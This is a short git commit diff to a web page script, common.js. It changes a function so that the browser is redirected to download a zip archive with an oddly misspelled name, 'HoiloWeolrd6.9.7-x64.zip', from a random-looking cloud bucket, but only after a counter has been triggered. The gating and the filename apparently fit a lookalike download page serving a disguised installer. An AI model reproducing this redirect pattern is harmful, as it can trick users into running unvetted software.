98ce2bb2f685060245256759d89d5e356a07e0cf
avicil <meetrover37@gmail.com>
2025-06-21 17:15:59 +0800

    Add files via upload

--- common.js
+++ common.js
@@ -1,5 +1,14 @@
-function GetToFunction()
+function loadUrl()
 {
-	var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
-	window.location=url;
+	if(num>=1)
+	{
+		var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
+		window.location=url;
+	}
+}
+
+var num=0;
+function getLoad()
+{
+	num++;
 }
